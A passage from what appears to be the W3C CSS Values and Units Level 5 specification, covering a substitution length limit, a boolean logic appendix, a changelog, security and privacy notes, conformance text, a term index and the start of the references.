<a id="ref-for-guaranteed-invalid-value①⑦"></a>

To avoid this sort of attack, UAs must impose a UA-defined limit on the allowed length of the token stream that an [arbitrary substitution function](#arbitrary-substitution-function) expands into. If an <a id="ref-for-arbitrary-substitution-function②③"></a>arbitrary substitution function would expand into a longer token stream than this limit, it instead is replaced with the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value).

This specification does not define what size limit should be imposed. However, since there are valid use-cases for custom properties that contain a kilobyte or more of text, it’s recommended that the limit be set relatively high.

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The general principle that UAs are allowed to violate standards due to resource constraints is still generally true here; a UA might, separately, have limits on how long of a custom property they can support, or how large of an identifier they can support. This section calls out this attack specifically because of its long history, and the fact that it can be done without any of the pieces <em>seeming</em> to be too large on first inspection.

## <a id="boolean-logic"></a> Appendix B: Boolean Logic

<a id="ref-for-typedef-boolean-expr⑧"></a>

<a id="ref-for-typedef-general-enclosed②"></a>

<a id="ref-for-at-ruledef-supports③"></a>

In order to accommodate future extensions of CSS, [\<boolean-expr\[\]\>](#typedef-boolean-expr) productions generally interpret their [\<general-enclosed\>](https://www.w3.org/TR/mediaqueries-5/#typedef-general-enclosed) grammar branch as unknown, and their boolean logic is resolved using 3-value Kleene logic. In some cases (such as [@supports](https://www.w3.org/TR/css-conditional-3/#at-ruledef-supports)), <a id="ref-for-typedef-general-enclosed③"></a>\<general-enclosed\> is instead defined as false; in which case the logic devolves to standard boolean algebra.

3-value boolean logic is applied recursively to a boolean condition <var>test</var> as follows:

- A leaf-level <var>test</var> resolves to true, false, or unknown, as defined by the relevant specification.

- not <var>test</var> evaluates to true if its contained <var>test</var> is false, false if it’s true, and unknown if it’s unknown.

- Multiple <var>test</var>s connected with and evaluate to true if <em>all</em> of those <var>test</var>s are true, false if <em>any</em> of them are false, and unknown otherwise (i.e. if at least one unknown, but no false).

- Multiple <var>test</var>s connected with or evaluate to true if <em>any</em> of those <var>test</var>s are true, false if <em>all</em> of them are false, and unknown otherwise (i.e. at least one unknown, but no true).

<a id="ref-for-typedef-boolean-expr⑨"></a>

If a “top-level” [\<boolean-expr\[\]\>](#typedef-boolean-expr) is unknown, and the containing context doesn’t otherwise define how to handle unknown conditions, it evaluates to false.

<a id="ref-for-top-level-calculation"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: That is, unknown doesn’t “escape” a 3-value boolean expression unless explicitly handled, similar to how `NaN` doesn’t “escape” a [top-level calculation](https://www.w3.org/TR/css-values-4/#top-level-calculation)).

## <a id="acknowledgments"></a> Acknowledgments

Firstly, the editors would like to thank all of the contributors to the [previous level](https://www.w3.org/TR/css-values-4/#acknowledgments) of this module.

Secondly, we would like to acknowledge Guillaume Lebas, L. David Baron, Mike Bremford, Sebastian Zartner, and [especially Scott Kellum](https://github.com/w3c/csswg-drafts/issues/6245) for their ideas, comments, and suggestions for Level 5;

## <a id="changes"></a> Changes

Changes since the [17 September 2024 Working Draft](https://www.w3.org/TR/2024/WD-css-values-5-20240917/):

- Changed the “comma-upgrading” behavior of allowing semicolons to “comma-wrapping” using braces. ([Issue 9539](https://github.com/w3c/csswg-drafts/issues/9539))

- <a id="ref-for-funcdef-if⑦"></a>

  Added [if()](#funcdef-if). ([Issue 10064](https://github.com/w3c/csswg-drafts/issues/10064), [Issue 5009](https://github.com/w3c/csswg-drafts/issues/5009#issuecomment-2442787271))

- <a id="ref-for-funcdef-inherit④"></a>

  Added [inherit()](#funcdef-inherit). ([Issue 2864](https://github.com/w3c/csswg-drafts/issues/2864))

- <a id="ref-for-funcdef-attr①⑨"></a>

  Redesigned [attr()](#funcdef-attr). ([Issue 10437](https://github.com/w3c/csswg-drafts/issues/10437), [Issue 5092](https://github.com/w3c/csswg-drafts/issues/5092), [Issue 5136](https://github.com/w3c/csswg-drafts/issues/5136))

- <a id="ref-for-funcdef-clamp"></a>

  Changed \*progress() functions to use commas for argument separation, for consistency with \*mix() and [clamp()](https://www.w3.org/TR/css-values-4/#funcdef-clamp). ([Issue 10489](https://github.com/w3c/csswg-drafts/issues/10489))

- <a id="ref-for-typedef-boolean-expr①⓪"></a>

  <a id="ref-for-css-value-definition-syntax①"></a>

  Defined new [\<boolean-expr\[\]\>](#typedef-boolean-expr) multipler for the [value definition syntax](https://www.w3.org/TR/css-values-4/#css-value-definition-syntax). ([Issue 10457](https://github.com/w3c/csswg-drafts/issues/10457))

- <a id="ref-for-arbitrary-substitution-function②④"></a>

  Imported definition of [arbitrary substitution function](#arbitrary-substitution-function) from [\[CSS-VARIABLES-1\]](#biblio-css-variables-1). ([Issue 10679](https://github.com/w3c/csswg-drafts/issues/10679))

- <a id="ref-for-typedef-syntax①⑧"></a>

  <a id="ref-for-funcdef-attr②⓪"></a>

  Imported the [\<syntax\>](#typedef-syntax) production from [\[css-properties-values-api-1\]](#biblio-css-properties-values-api-1) (for use in [attr()](#funcdef-attr)).

- <a id="ref-for-funcdef-media-progress⑨"></a>

  <a id="ref-for-funcdef-container-progress⑧"></a>

  Corrected errors in the syntax of [media-progress()](#funcdef-media-progress) and [container-progress()](#funcdef-container-progress).

Changes since the [First Public Working Draft](https://www.w3.org/TR/2024/WD-css-values-5-20240913/) include:

- <a id="ref-for-typedef-position①⑦"></a>

  <a id="ref-for-flow-relative①"></a>

  Incorporated the definition of [\<position\>](#typedef-position), extending it to handle [flow-relative](https://www.w3.org/TR/css-writing-modes-4/#flow-relative) positions. ([Issue 549](https://github.com/w3c/csswg-drafts/issues/549#issuecomment-1823607623))

### <a id="additions-L4"></a> Additions Since Level 4

Additions since [CSS Values and Units Level 4](https://www.w3.org/TR/css-values-4/):

- Added the “comma-wrapping” {} notation for function arguments.

- <a id="ref-for-typedef-url-modifier①"></a>

  <a id="ref-for-url-value⑥"></a>

  Defined several [\<url-modifier\>](https://www.w3.org/TR/css-values-4/#typedef-url-modifier)s for [\<url\>](https://www.w3.org/TR/css-values-4/#url-value) functions.

- <a id="ref-for-typedef-position①⑧"></a>

  <a id="ref-for-flow-relative②"></a>

  Extended [\<position\>](#typedef-position) to handle [flow-relative](https://www.w3.org/TR/css-writing-modes-4/#flow-relative) positions. ([Issue 549](https://github.com/w3c/csswg-drafts/issues/549#issuecomment-1823607623))

- Added the [\*-progress()](#progress) family of functions, to represent interpolation progress between two values.

- Added the [\*-mix()](#mixing) family of functions, to represent actually interpolating between two values.

- <a id="ref-for-funcdef-first-valid③"></a>

  Added [first-valid()](#funcdef-first-valid), to allow CSS’s forward-compatible parsing behavior (drop invalid things, go with what’s left) to be used with custom properties and other contexts where validity isn’t known until <em>after</em> parsing.

- <a id="ref-for-funcdef-if⑧"></a>

  Added [if()](#funcdef-if) for inline conditionals.

- <a id="ref-for-funcdef-inherit⑤"></a>

  Added [inherit()](#funcdef-inherit).

- <a id="ref-for-funcdef-toggle①⑤"></a>

  <a id="ref-for-funcdef-attr②①"></a>

  Added the [toggle()](#funcdef-toggle) and [attr()](#funcdef-attr) functions.

- <a id="ref-for-funcdef-random②①"></a>

  <a id="ref-for-funcdef-random-item①⑥"></a>

  Added the [random()](#funcdef-random) and [random-item()](#funcdef-random-item) functions.

- <a id="ref-for-funcdef-sibling-count②"></a>

  <a id="ref-for-funcdef-sibling-index④"></a>

  Added the [sibling-count()](#funcdef-sibling-count) and [sibling-index()](#funcdef-sibling-index) functions.

- <a id="ref-for-funcdef-calc-size②⑨"></a>

  <a id="ref-for-propdef-interpolate-size④"></a>

  Added the [calc-size()](#funcdef-calc-size) function, and the related [interpolate-size](#propdef-interpolate-size) property.

- <a id="ref-for-typedef-boolean-expr①①"></a>

  <a id="ref-for-css-value-definition-syntax②"></a>

  Added the [\<boolean-expr\[\]\>](#typedef-boolean-expr) syntax notation to the [value definition syntax](https://www.w3.org/TR/css-values-4/#css-value-definition-syntax).

## <a id="security"></a> Security Considerations

<a id="ref-for-url-value⑦"></a>

<a id="ref-for-the-img-element"></a>

<a id="ref-for-the-link-element"></a>

This specification allows CSS [\<url\>](https://www.w3.org/TR/css-values-4/#url-value) values to have various aspects of their request modified. Although this is new to CSS, every ability is already present in <code><a href="https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element">img</a></code> or <code><a href="https://html.spec.whatwg.org/multipage/semantics.html#the-link-element">link</a></code>, as well as via JavaScript.

<a id="ref-for-funcdef-attr②②"></a>

The [attr()](#funcdef-attr) function allows HTML attribute values to be used in CSS values, potentially exposing sensitive information that was previously not accessible via CSS. See [§ 7.7.2 Security](#attr-security).

## <a id="privacy"></a> Privacy Considerations

<a id="ref-for-funcdef-media-progress①⓪"></a>

<a id="ref-for-media-query⑤"></a>

This specification defines units that expose the user’s screen size and default font size, but both are trivially observable from JS, so they do not constitute a new privacy risk. Similarly the [media-progress()](#funcdef-media-progress) notation exposes information about the user’s environment and preferences that are already observiable via [media queries](https://www.w3.org/TR/mediaqueries-5/#media-query).

<a id="ref-for-funcdef-attr②③"></a>

The [attr()](#funcdef-attr) function allows HTML attribute values to be used in CSS values, potentially exposing sensitive information that was previously not accessible via CSS. See [§ 7.7.2 Security](#attr-security).

## <a id="w3c-conformance"></a> Conformance

### <a id="w3c-conventions"></a> Document conventions

Conformance requirements are expressed with a combination of descriptive assertions and RFC 2119 terminology. The key words “MUST”, “MUST NOT”, “REQUIRED”, “SHALL”, “SHALL NOT”, “SHOULD”, “SHOULD NOT”, “RECOMMENDED”, “MAY”, and “OPTIONAL” in the normative parts of this document are to be interpreted as described in RFC 2119. However, for readability, these words do not appear in all uppercase letters in this specification.

All of the text of this specification is normative except sections explicitly marked as non-normative, examples, and notes. [\[RFC2119\]](#biblio-rfc2119)

Examples in this specification are introduced with the words “for example” or are set apart from the normative text with `class="example"`, like this:

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="w3c-example"></a>
>
> This is an example of an informative example.

Informative notes begin with the word “Note” and are set apart from the normative text with `class="note"`, like this:

> <strong data-conversion-semantic="note">Note</strong>
>
> Note, this is an informative note.

Advisements are normative sections styled to evoke special attention and are set apart from other normative text with `<strong class="advisement">`, like this: <strong data-conversion-semantic="advisement">Advisement:</strong> <strong> UAs MUST provide an accessible alternative. </strong>

### <a id="w3c-conformance-classes"></a> Conformance classes

Conformance to this specification is defined for three conformance classes:

style sheet  
A [CSS style sheet](https://www.w3.org/TR/CSS21/conform.html#style-sheet).

renderer  
A [UA](https://www.w3.org/TR/CSS21/conform.html#user-agent) that interprets the semantics of a style sheet and renders documents that use them.

authoring tool  
A [UA](https://www.w3.org/TR/CSS21/conform.html#user-agent) that writes a style sheet.

A style sheet is conformant to this specification if all of its statements that use syntax defined in this module are valid according to the generic CSS grammar and the individual grammars of each feature defined in this module.

A renderer is conformant to this specification if, in addition to interpreting the style sheet as defined by the appropriate specifications, it supports all the features defined by this specification by parsing them correctly and rendering the document accordingly. However, the inability of a UA to correctly render a document due to limitations of the device does not make the UA non-conformant. (For example, a UA is not required to render color on a monochrome monitor.)

An authoring tool is conformant to this specification if it writes style sheets that are syntactically correct according to the generic CSS grammar and the individual grammars of each feature in this module, and meet all other conformance requirements of style sheets as described in this module.

### <a id="w3c-partial"></a> Partial implementations

So that authors can exploit the forward-compatible parsing rules to assign fallback values, CSS renderers <strong>must</strong> treat as invalid (and [ignore as appropriate](https://www.w3.org/TR/CSS21/conform.html#ignore)) any at-rules, properties, property values, keywords, and other syntactic constructs for which they have no usable level of support. In particular, user agents <strong>must not</strong> selectively ignore unsupported component values and honor supported values in a single multi-value property declaration: if any value is considered invalid (as unsupported values must be), CSS requires that the entire declaration be ignored.

#### <a id="w3c-conform-future-proofing"></a> Implementations of Unstable and Proprietary Features

To avoid clashes with future stable CSS features, the CSSWG recommends [following best practices](https://www.w3.org/TR/CSS/#future-proofing) for the implementation of [unstable](https://www.w3.org/TR/CSS/#unstable) features and [proprietary extensions](https://www.w3.org/TR/CSS/#proprietary-extension) to CSS.

### <a id="w3c-testing"></a> Non-experimental implementations

Once a specification reaches the Candidate Recommendation stage, non-experimental implementations are possible, and implementors should release an unprefixed implementation of any CR-level feature they can demonstrate to be correctly implemented according to spec.

To establish and maintain the interoperability of CSS across implementations, the CSS Working Group requests that non-experimental CSS renderers submit an implementation report (and, if necessary, the testcases used for that implementation report) to the W3C before releasing an unprefixed implementation of any CSS features. Testcases submitted to W3C are subject to review and correction by the CSS Working Group.

Further information on submitting testcases and implementation reports can be found from on the CSS Working Group’s website at [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;Style&#x2F;CSS&#x2F;Test&#x2F;](https://www.w3.org/Style/CSS/Test/)&#x2E; Questions should be directed to the [public-css-testsuite@w3.org](https://lists.w3.org/Archives/Public/public-css-testsuite) mailing list.

## <a id="index"></a>Index

### <a id="index-defined-here"></a>Terms defined by this specification

- [allow-keywords](#valdef-interpolate-size-allow-keywords), in § 10.4
- [\<'animation-timeline'\>](#valdef-progress-animation-timeline), in § 6.1
- [anonymous](#valdef-request-url-modifier-anonymous), in § 4.1.1
- [any](#valdef-calc-size-any), in § 10.2
- [apply request modifiers from URL value](#apply-request-modifiers-from-url-value), in § 4.1.1
- [arbitrary substitution](#substitute-arbitrary-substitution-function), in § Unnumbered section
- [arbitrary substitution function](#arbitrary-substitution-function), in § Unnumbered section
- [attr()](#funcdef-attr), in § 7.7
- [\<attr-name\>](#typedef-attr-name), in § 7.7
- [attr()-taint](#attr-taint), in § 7.7.2
- [block-end](#valdef-position-block-end), in § 4.2
- [block-start](#valdef-position-block-start), in § 4.2
- [\<boolean-expr\[\]\>](#typedef-boolean-expr), in § 3.2
- [bottom](#valdef-position-bottom), in § 4.2
- [\<calc-mix()\>](#typedef-calc-mix), in § 6.2
- [calc-mix()](#funcdef-calc-mix), in § 6.2
- [calc-size()](#funcdef-calc-size), in § 10
- [\<calc-size-basis\>](#typedef-calc-size-basis), in § 10
- [calc-size basis](#calc-size-basis), in § 10
- [calc-size calculation](#calc-size-calculation), in § 10
- [calculate a progress function](#calculate-a-progress-function), in § 5
- [canonicalize for interpolation](#calc-size-canonicalize-for-interpolation), in § 10.1
- [center](#valdef-position-center), in § 4.2
- [comma-containing productions](#comma-containing-productions), in § 3.1.1
- [\<container-progress()\>](#typedef-container-progress), in § 5.3
- [container-progress()](#funcdef-container-progress), in § 5.3
- [crossorigin()](#funcdef-request-url-modifier-crossorigin), in § 4.1.1
- [\<crossorigin-modifier\>](#typedef-request-url-modifier-crossorigin-modifier), in § 4.1.1
- [de-percentify a calc-size calculation](#de-percentify-a-calc-size-calculation), in § 10.1
- [\<easing-function\>](#valdef-progress-easing-function), in § 6.1
- [else](#valdef-if-else), in § 7.3
- [\<first-valid()\>](#typedef-first-valid), in § 7.2
- [first-valid()](#funcdef-first-valid), in § 7.2
- [\<if()\>](#typedef-if), in § 7.3
- [if()](#funcdef-if), in § 7.3
- [\<if-condition\>](#typedef-if-condition), in § 7.3
- [\<if-test\>](#typedef-if-test), in § 7.3
- [\<inherit()\>](#typedef-inherit), in § 7.6
- [inherit()](#funcdef-inherit), in § 7.6
- [inline-end](#valdef-position-inline-end), in § 4.2
- [inline-start](#valdef-position-inline-start), in § 4.2
- [integrity()](#funcdef-request-url-modifier-integrity), in § 4.1.1
- [\<integrity-modifier\>](#typedef-request-url-modifier-integrity-modifier), in § 4.1.1
- [interpolate-size](#propdef-interpolate-size), in § 10.4
- [\<intrinsic-size-keyword\>](#typedef-intrinsic-size-keyword), in § 10
- [invalid at computed-value time](#invalid-at-computed-value-time), in § Unnumbered section
- [left](#valdef-position-left), in § 4.2
- [\<length-percentage\>](#valdef-position-length-percentage), in § 4.2
- [\<media-progress()\>](#typedef-media-progress), in § 5.2
- [media-progress()](#funcdef-media-progress), in § 5.2
- [\<mix()\>](#typedef-mix), in § 6.6
- [mix()](#funcdef-mix), in § 6.6
- [mix end value](#mix-end-value), in § 6
- [mix notations](#mix-notations), in § 6
- [mix progress value](#mix-progress-value), in § 6
- [mix start value](#mix-start-value), in § 6
- [non-strict comma-containing production](#non-strict-comma-containing-production), in § 3.1.1
- [no-referrer](#valdef-request-url-modifier-no-referrer), in § 4.1.1
- [no-referrer-when-downgrade](#valdef-request-url-modifier-no-referrer-when-downgrade), in § 4.1.1
- [\<number\>](#valdef-progress-number), in § 6.1
- [numeric-only](#valdef-interpolate-size-numeric-only), in § 10.4
- [origin](#valdef-request-url-modifier-origin), in § 4.1.1
- [origin-when-cross-origin](#valdef-request-url-modifier-origin-when-cross-origin), in § 4.1.1
- [parse with a \<syntax\>](#parse-with-a-syntax), in § 3.3.1
- [pending-substitution value](#pending-substitution-value), in § Unnumbered section
- [\<percentage-token\>](#valdef-progress-percentage-token), in § 6.1
- [\<position\>](#typedef-position), in § 4.2
- [\<position-four\>](#typedef-position-four), in § 4.2
- [\<position-one\>](#typedef-position-one), in § 4.2
- [\<position-two\>](#typedef-position-two), in § 4.2
- [\<progress()\>](#typedef-progress-fn), in § 5.1
- [\<progress\>](#typedef-progress), in § 6.1
- [progress()](#funcdef-progress), in § 5.1
- [progress end value](#progress-end-value), in § 5
- [progress start value](#progress-start-value), in § 5
- [progress value](#progress-value), in § 5
- [random()](#funcdef-random), in § 8.1
- [random-caching key](#random-caching-key), in § 8.3
- [\<random-caching-options\>](#typedef-random-caching-options), in § 8.1
- [random functions](#css-random-functions), in § 8
- [random-item()](#funcdef-random-item), in § 8.2
- [referrerpolicy()](#funcdef-request-url-modifier-referrerpolicy), in § 4.1.1
- [\<referrerpolicy-modifier\>](#typedef-request-url-modifier-referrerpolicy-modifier), in § 4.1.1
- [\<request-url-modifier\>](#typedef-request-url-modifier), in § 4.1.1
- [resolve an arbitrary substitution function](#resolve-an-arbitrary-substitution-function), in § Unnumbered section
- [resolve an attr() function](#resolve-an-attr-function), in § 7.7.1
- [resolve an if() function](#resolve-an-if-function), in § 7.3
- [resolve an inherit() function](#resolve-an-inherit-function), in § 7.6
- [right](#valdef-position-right), in § 4.2
- [same-origin](#valdef-request-url-modifier-same-origin), in § 4.1.1
- [sibling-count()](#funcdef-sibling-count), in § 9
- [sibling-index()](#funcdef-sibling-index), in § 9
- [size](#valdef-calc-size-size), in § 10
- [strict-origin](#valdef-request-url-modifier-strict-origin), in § 4.1.1
- [strict-origin-when-cross-origin](#valdef-request-url-modifier-strict-origin-when-cross-origin), in § 4.1.1
- [substitute](#substitute-arbitrary-substitution-function), in § Unnumbered section
- [substitute arbitrary substitution function](#substitute-arbitrary-substitution-function), in § Unnumbered section
- [substitute into a calc-size calculation](#substitute-into-a-calc-size-calculation), in § 10.1
- [substitution](#substitute-arbitrary-substitution-function), in § Unnumbered section
- [\<syntax\>](#typedef-syntax), in § 3.3
- [\<syntax-combinator\>](#typedef-syntax-combinator), in § 3.3
- [\<syntax-component\>](#typedef-syntax-component), in § 3.3
- [\<syntax-multiplier\>](#typedef-syntax-multiplier), in § 3.3
- [\<syntax-single-component\>](#typedef-syntax-single-component), in § 3.3
- [\<syntax-string\>](#typedef-syntax-string), in § 3.3
- [\<syntax-type-name\>](#typedef-syntax-type-name), in § 3.3
- [\<toggle()\>](#typedef-toggle), in § 7.4
- [toggle()](#funcdef-toggle), in § 7.4
- [top](#valdef-position-top), in § 4.2
- [\<transform-mix()\>](#typedef-transform-mix), in § 6.5
- [transform-mix()](#funcdef-transform-mix), in § 6.5
- [unsafe-url](#valdef-request-url-modifier-unsafe-url), in § 4.1.1
- [use-credentials](#valdef-request-url-modifier-use-credentials), in § 4.1.1
- [\<whole-value\>](#whole-value), in § 7
- [x-end](#valdef-position-x-end), in § 4.2
- [x-start](#valdef-position-x-start), in § 4.2
- [y-end](#valdef-position-y-end), in § 4.2
- [y-start](#valdef-position-y-start), in § 4.2

### <a id="index-defined-elsewhere"></a>Terms defined by reference

- \[CSS-ALIGN-3\] defines the following terms:
  - <a id="fb5c7e3f"></a>alignment container
  - <a id="dc2ecc7a"></a>alignment subject
- \[CSS-ANIMATIONS-1\] defines the following terms:
  - <a id="7a34d6ba"></a>\<keyframes-name\>
  - <a id="7177b17d"></a>@keyframes
- \[CSS-ANIMATIONS-2\] defines the following terms:
  - <a id="f5426905"></a>animation-timeline
  - <a id="c453ced3"></a>auto
  - <a id="5bd2d516"></a>none
- \[CSS-BACKGROUNDS-3\] defines the following terms:
  - <a id="1fa52ca0"></a>background positioning area
  - <a id="2754893b"></a>background-color
  - <a id="5ced56d0"></a>background-image
  - <a id="f2249e38"></a>background-position
  - <a id="44e4312c"></a>center
- \[CSS-BOX-4\] defines the following terms:
  - <a id="58404105"></a>margin-top
- \[CSS-CASCADE-5\] defines the following terms:
  - <a id="8c8e51b4"></a>computed value
  - <a id="d0dc95c3"></a>inherit
  - <a id="cbeb753c"></a>inheritance
  - <a id="4905669f"></a>inherited value
  - <a id="762bad34"></a>initial
  - <a id="6b448e93"></a>initial value
  - <a id="8f27be0f"></a>longhand property
  - <a id="e14541aa"></a>shorthand
  - <a id="980ac56a"></a>shorthand property
  - <a id="d5e08d9c"></a>specified value
  - <a id="7c39b465"></a>unset
  - <a id="1a2b1083"></a>used value
- \[CSS-CASCADE-6\] defines the following terms:
  - <a id="aa433d97"></a>cascade
- \[CSS-COLOR-4\] defines the following terms:
  - <a id="a976c737"></a>blue
  - <a id="bcdf9b19"></a>color
  - <a id="45dae945"></a>green
  - <a id="3b7558dc"></a>opacity
  - <a id="970f70ea"></a>red
  - <a id="96e27c16"></a>transparent
- \[CSS-COLOR-5\] defines the following terms:
  - <a id="8d27d874"></a>\<color-interpolation-method\>
  - <a id="d04b6986"></a>\<color\>
  - <a id="0644a74e"></a>color-mix()
- \[CSS-CONDITIONAL-3\] defines the following terms:
  - <a id="cc30ecb8"></a>\<supports-condition\>
  - <a id="4397147f"></a>@media
  - <a id="a5d6c9d2"></a>@supports
- \[CSS-CONDITIONAL-5\] defines the following terms:
  - <a id="78b42167"></a>\<container-name\>
  - <a id="8574256a"></a>\<size-feature\>
  - <a id="a35169e0"></a>\<style-query\>
  - <a id="d56fefb4"></a>@container
  - <a id="e2be1733"></a>container feature
  - <a id="fbc261d2"></a>size features
- \[CSS-DISPLAY-3\] defines the following terms:
  - <a id="9c6aec4c"></a>element
- \[CSS-EASING-2\] defines the following terms:
  - <a id="eef9f659"></a>\<easing-function\>
  - <a id="a2a5dbcf"></a>easing function
- \[CSS-FONTS-4\] defines the following terms:
  - <a id="7066562d"></a>font-family
  - <a id="bd7559da"></a>font-palette
  - <a id="b5dffdd5"></a>monospace
  - <a id="ecdc236d"></a>palette-mix()
  - <a id="b0928dd2"></a>sans-serif
- \[CSS-IMAGES-3\] defines the following terms:
  - <a id="35bf32f2"></a>\<image\>
- \[CSS-IMAGES-4\] defines the following terms:
  - <a id="8bfedfd3"></a>\<cf-image\>
  - <a id="b4591168"></a>cross-fade()
- \[CSS-LISTS-3\] defines the following terms:
  - <a id="598f7b8c"></a>counter()
- \[CSS-PROPERTIES-VALUES-API-1\] defines the following terms:
  - <a id="64732706"></a>@property
  - <a id="48a9c0ef"></a>registered custom property
  - <a id="3b4a654b"></a>supported syntax component name
  - <a id="9f3001fd"></a>syntax definition
  - <a id="7e1633df"></a>universal syntax definition
- \[CSS-SCOPING-1\] defines the following terms:
  - <a id="22109b0e"></a>flat tree
- \[CSS-SIZING-3\] defines the following terms:
  - <a id="c20b5ff5"></a>auto
  - <a id="a91daf3b"></a>behave as auto
  - <a id="66f218c1"></a>definite
  - <a id="5ad01cca"></a>height
  - <a id="3ade8b07"></a>intrinsic size
  - <a id="8cdc912e"></a>max-content
  - <a id="d3da3539"></a>min-content
  - <a id="49731d1d"></a>width
- \[CSS-SIZING-4\] defines the following terms:
  - <a id="133ee38d"></a>stretch
- \[CSS-SYNTAX-3\] defines the following terms:
  - <a id="4920620f"></a>\<any-value\>
  - <a id="04853566"></a>\<declaration-value\>
  - <a id="f9309bf7"></a>\<delim-token\>
  - <a id="446c663e"></a>\<ident-token\>
  - <a id="8a73a2e3"></a>\<percentage-token\>
  - <a id="267b6766"></a>component value
  - <a id="67800454"></a>parse
  - <a id="4b48ffac"></a>parse a list of component values
  - <a id="ce7224b2"></a>parse something according to a CSS grammar
  - <a id="fa522ba4"></a>whitespace
- \[CSS-TRANSFORMS-1\] defines the following terms:
  - <a id="76b6d2eb"></a>\<transform-list\>
  - <a id="31452ed5"></a>transform-origin
- \[CSS-TRANSFORMS-2\] defines the following terms:
  - <a id="c43222a2"></a>\<transform-function\>
- \[CSS-TRANSITIONS-1\] defines the following terms:
  - <a id="4d0c1c86"></a>after-change style
- \[CSS-TYPED-OM-1\] defines the following terms:
  - <a id="f19fcfc8"></a>match
  - <a id="6697014f"></a>type
- \[CSS-VALUES-4\] defines the following terms:
  - <a id="c297b070"></a>\#
  - <a id="bdb4e757"></a>&#x26;&#x26;
  - <a id="ef9f8297"></a>\*
  - <a id="8cd4f032"></a>,
  - <a id="f9e6c5c6"></a>\<calc-sum\>
  - <a id="f5b34cad"></a>\<dashed-ident\>
  - <a id="51ba8407"></a>\<dimension\>
  - <a id="dcecfc13"></a>\<ident\>
  - <a id="d73c993d"></a>\<integer\>
  - <a id="4fd7e54f"></a>\<length-percentage\>
  - <a id="98ddb9b0"></a>\<length\>
  - <a id="61bb5e44"></a>\<number\>
  - <a id="128295ac"></a>\<percentage\>
  - <a id="1d798932"></a>\<string\>
  - <a id="7aaa7c88"></a>\<time\>
  - <a id="72b95752"></a>\<url-modifier\>
  - <a id="699488a8"></a>\<url\>
  - <a id="d4441b24"></a>?
  - <a id="14d3255d"></a>calc()
  - <a id="fdbd0bc3"></a>calculation
  - <a id="cb0b07ea"></a>clamp()
  - <a id="655c9867"></a>consistent type
  - <a id="8a110a7b"></a>CSS-wide keywords
  - <a id="6facc447"></a>determine the type of a calculation
  - <a id="de901111"></a>functional notation
  - <a id="ce7ea0de"></a>identifier
  - <a id="a0feb601"></a>interpolation
  - <a id="0aac835b"></a>keyword
  - <a id="ebb80614"></a>made consistent
  - <a id="3db7b9e0"></a>math function
  - <a id="4f9427f1"></a>round()
  - <a id="6dbced85"></a>simplify a calculation tree
  - <a id="a959f189"></a>small viewport size
  - <a id="11bd87b9"></a>top-level calculation
  - <a id="094771ea"></a>URL request modifier steps
  - <a id="a379da23"></a>value addition
  - <a id="15d1a46a"></a>value definition syntax
  - <a id="8cbc2b3b"></a>{A}
  - <a id="4eb9d37e"></a>\|
  - <a id="a0336d84"></a>\|\|
- \[CSS-VALUES-5\] defines the following terms:
  - <a id="a355cac5"></a>substitute an attr()
- \[CSS-VARIABLES-1\] defines the following terms:
  - <a id="310b3140"></a>\<custom-property-name\>
  - <a id="5550667d"></a>custom property
  - <a id="a47a9020"></a>guaranteed-invalid value
  - <a id="a39ee65d"></a>substitute a var()
  - <a id="3beec8c9"></a>var()
  - <a id="08b34eb4"></a>var() substitution
- \[CSS-WRITING-MODES-4\] defines the following terms:
  - <a id="b8dade0f"></a>block axis
  - <a id="599428b5"></a>block-axis
  - <a id="e112902f"></a>end
  - <a id="303c8d41"></a>flow-relative
  - <a id="a6eb24bb"></a>inline axis
  - <a id="82ddda8c"></a>inline-axis
  - <a id="90c7548c"></a>start
  - <a id="eb6008ce"></a>writing mode
  - <a id="e348080e"></a>x-axis
- \[CSS22\] defines the following terms:
  - <a id="8e531c37"></a>background-position
  - <a id="992a4717"></a>circle
  - <a id="3ca24cd8"></a>disc
  - <a id="45398ed5"></a>square
- \[CSSOM-1\] defines the following terms:
  - <a id="bfb148e6"></a>getComputedStyle(elt)
- \[DOM\] defines the following terms:
  - <a id="db0a062f"></a>attribute
  - <a id="27d9b7ea"></a>element
- \[ECMASCRIPT\] defines the following terms:
  - <a id="cf21212f"></a>random()
- \[FETCH\] defines the following terms:
  - <a id="902380f7"></a>credentials mode
  - <a id="d79a826f"></a>integrity metadata
  - <a id="cb98f71f"></a>mode
  - <a id="07582c28"></a>referrer policy
  - <a id="55213b5b"></a>request
- \[HTML\] defines the following terms:
  - <a id="1748bbeb"></a>details
  - <a id="f0811ff8"></a>img
  - <a id="6cfa013d"></a>link
- \[INFRA\] defines the following terms:
  - <a id="16d07e10"></a>for each
  - <a id="649608b9"></a>list
  - <a id="0698d556"></a>string
  - <a id="0e8de730"></a>tuple
- \[MEDIAQUERIES-5\] defines the following terms:
  - <a id="b9b36bfc"></a>\<general-enclosed\>
  - <a id="5cc939b8"></a>\<media-query\>
  - <a id="ef3b1aec"></a>\<mf-name\>
  - <a id="0a000463"></a>media feature
  - <a id="3ea2fcbb"></a>media query
  - <a id="8a490d77"></a>not
- \[REFERRER-POLICY\] defines the following terms:
  - <a id="a4b64c8b"></a>ReferrerPolicy
- \[SELECTORS-3\] defines the following terms:
  - <a id="dfd67b05"></a>\*
- \[SELECTORS-4\] defines the following terms:
  - <a id="3b74dc72"></a>:nth-child()
  - <a id="81967444"></a>attribute selector
  - <a id="7b5d8638"></a>originating element
  - <a id="4d06fa38"></a>pseudo-element
  - <a id="388bc3fc"></a>selector
  - <a id="fc8ac26a"></a>ultimate originating element
- \[WEB-ANIMATIONS-1\] defines the following terms:
  - <a id="ddbb25e9"></a>not animatable
- \[WEBIDL\] defines the following terms:
  - <a id="3b90bdcd"></a>resolve

## <a id="references"></a>References

### <a id="normative"></a>Normative References

<a id="biblio-css-align-3"></a>\[CSS-ALIGN-3\]  
Elika Etemad; Tab Atkins Jr.. [CSS Box Alignment Module Level 3](https://www.w3.org/TR/css-align-3/). 17 February 2023. WD. URL: [https&#x3A;&#x2F;&#x2F;www&#x2E;w3&#x2E;org&#x2F;TR&#x2F;css-align-3&#x2F;](https://www.w3.org/TR/css-align-3/)

<a id="biblio-css-animations-1"></a>\[CSS-ANIMATIONS-1\]  
